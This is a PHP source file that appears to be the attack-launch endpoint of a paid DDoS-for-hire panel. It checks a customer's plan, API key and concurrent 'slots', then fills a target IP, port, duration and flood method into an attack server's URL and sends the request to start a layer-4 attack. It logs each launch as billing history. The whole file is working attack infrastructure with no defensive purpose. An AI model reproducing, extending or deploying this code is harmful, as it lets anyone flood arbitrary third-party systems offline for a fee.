<?php
ignore_user_abort(true);
set_time_limit(0);
header("Content-Type: application/json");

if (!isset($_GET["host"]) ||
    !isset($_GET["duration"]) || !isset($_GET["method"])) {

    die(json_encode([
        "success" => false,
        "error" => 'Please verify all fields.',
    ]));
}

require_once '../includes/db.php';
require_once '../includes/init.php';

if (isset($info) && $info["l4"] == 1){
    die(json_encode([
        "success" => false,
        "error" => 'Layer4 disabled!',
    ]));
}

$host = $_GET['host'];
$port = 80;
$time = intval($_GET['duration']);
$method = $_GET['method'];
$api_key = null;

if (isset($_GET['key'])) {
    $api_key = $_GET['key'];
}

if (isset($_GET['port'])) {
    $port = intval($_GET['port']);
}

if (empty($host) || empty($time) || empty($port) || empty($method)) {
    die(json_encode([
        "success" => false,
        "error" => 'Please verify all fields.',
    ]));
}


if ($port < 1) {
    die(json_encode([
        "success" => false,
        "error" => 'The minimum accepted port is 1.',
    ]));
}


if ($port > 65535) {
    die(json_encode([
        "success" => false,
        "error" => 'The maximum accepted port is 65535.',
    ]));
}

if ($time < 30) {
    die(json_encode([
        "success" => false,
        "error" => 'The minimum accepted time is 30 seconds.',
    ]));
}

if (filter_var($host, FILTER_VALIDATE_IP) === FALSE) {
    die(json_encode([
        "success" => false,
        "error" => 'Host is not a valid IP.',
    ]));
}

if (!isset($sql)) {
    die(json_encode([
        "success" => false,
        "error" => 'No SQL Detected.',
    ]));
}
$ustimeapi = null;
$us = null;

if (!empty($api_key)) {
    $api_plus = $sql->prepare("SELECT * FROM `apiplus` WHERE `apikey` = :key");
    $api_plus->execute([':key' => $api_key]);
    $api_plus = $api_plus->fetch(PDO::FETCH_ASSOC);

    if (empty($api_plus)) {
        die(json_encode([
            "success" => false,
            "error" => 'Your key or your user id is invalid.',
        ]));
    }

    $us = $api_plus["user"];
    $ustimeapi = $api_plus['timeapi'];

    $plansql = $sql->prepare("SELECT `users`.*,`plans`.`name`, `plans`.`mbt`, `plans`.`nbr`, `plans`.`code`, `plans`.`api` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id LIMIT 1");
    $plansql->execute(array(":id" => $us));
    $userInfo = $plansql->fetch(PDO::FETCH_ASSOC);

    if (!$userInfo["api"]) {
        die(json_encode([
            "success" => false,
            "error" => "You don't have access to usage api!",
        ]));
    }

} else {
    include '../includes/configuration.php';
    include '../includes/extra.php';
    $us = $_SESSION["ID"];


    if (!isset($_GET["__csrf"]) || $_GET["__csrf"] != $_SESSION['token']) {
        die(json_encode([
            "success" => false,
            "error" => 'Invalid request.',
        ]));
    }
}
if (empty($us)) {
    die(json_encode([
        "success" => false,
        "error" => 'Please put your api key.',
    ]));
}

if (empty($us)) {
    die(json_encode([
        "success" => false,
        "error" => 'Please put your api key.',
    ]));
}

$SQLGetInfo = $sql->prepare("SELECT * FROM `users` WHERE `ID` = :id");
$SQLGetInfo->execute(array(':id' => $us));
$usInf = $SQLGetInfo->fetch(PDO::FETCH_ASSOC);

if (empty($ustimeapi)) {
    $plansql = $sql->prepare("SELECT `users`.*,`plans`.`name`, `plans`.`mbt`, `plans`.`nbr`, `plans`.`code`, `plans`.`api` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id LIMIT 1");
    $plansql->execute(array(":id" => $_SESSION['ID']));
    $userInfo = $plansql->fetch(PDO::FETCH_ASSOC);

    $ustimeapi = $usInf["secs"] + $userInfo['mbt'];
}

$usname = $usInf['username'];
$us_id = $usInf['ID'];
$us_concu = $usInf['concu'];

$SQLGetInfo = $sql->prepare("SELECT `classement` FROM `methodes` WHERE `method` = :method");
$SQLGetInfo->execute(array(':method' => htmlspecialchars($method)));
$type = $SQLGetInfo->fetchColumn();

if ($type !== '4') {
    die(json_encode([
        "success" => false,
        "error" => 'this method is unavailable on layer4',
    ]));
}

$countRunning = $sql->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND
                                  `time` + `date` > UNIX_TIMESTAMP()");
$countRunning->execute(array(':username' => $usname));
$countRunning = $countRunning->fetchColumn();

$SQLGetTime = $sql->prepare("SELECT `plans`.`nbr` FROM `plans` LEFT JOIN `users` ON
    `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
$SQLGetTime->execute(array(':id' => $us_id));
$concur = $SQLGetTime->fetchColumn();

if ($countRunning >= ($concur + $us_concu)) {
    die(json_encode([
        "success" => false,
        "error" => 'Your has run out of slots, please wait!.',
    ]));
}

$SQLCheckBlacklist = $sql->prepare("SELECT note FROM `blacklist` WHERE `IP` = :host");
$SQLCheckBlacklist->execute([':host' => $host]);
$blacklistnote = $SQLCheckBlacklist->fetchColumn();
if (!empty($blacklistnote)) {
    die(json_encode([
        "success" => false,
        "error" => sprintf("Target Blacklisted, Reason: %s", htmlspecialchars($blacklistnote)),
    ]));
}

if ($time > $ustimeapi) {
    die(json_encode([
        "success" => false,
        "error" => 'You have exceeded the time allowed!',
    ]));
}

$servers = [];
$ServersRotation = $sql->query("SELECT * FROM `serveurs` WHERE `type` = $type AND `status` = 0 ORDER BY ABS(`date`) ASC LIMIT 1;");

if ($ServersRotation->rowCount() != 0) {
    $servers = $ServersRotation->fetchAll(PDO::FETCH_ASSOC);
    $id = $servers[0]['ID'];
    $address = $servers[0]['adresse'];

    $checkServers = $sql->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND`time` + `date` > UNIX_TIMESTAMP()");
    $checkServers->execute([':username' => $usname]);
    $countServeur = $checkServers->fetchColumn();

    findFreeServer($sql, $id);

    $address = str_replace("%user%", $usname,
        str_replace("%hote%", $host,
            str_replace("%type%", $method,
                str_replace("%port%", $port,
                    str_replace("%temps%", $time, $address)))));

    API_SendRequest($address);

    $insertLogSQL = $sql->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :timerst, :method, :serveur, :note, '', UNIX_TIMESTAMP())");
    $insertLogSQL->execute([':user' => $usname, ':ip' => $host, ':port' => $port, ':time' => $time, ':timerst' => $time, ':method' => $method, ':serveur' => $id, ':note' => "None"]);

    $updateServer = $sql->prepare("UPDATE `serveurs` SET `date` = UNIX_TIMESTAMP(NOW()) WHERE `ID` = :id");
    $updateServer->execute([':id' => $id]);


    if (!empty($api_key)) {
        $insertAPISQL = $sql->prepare("INSERT INTO `api_historique` VALUES(NULL, :clef, :username, :value, :type, :ip, UNIX_TIMESTAMP())");
        $insertAPISQL->execute([':clef' => $api_key, ':username' => $usname, ':value' => $method, ':type' => 'L4', ':ip' => $host]);
    }


    die(json_encode([
        "success" => true,
        "error" => '',
    ]));
}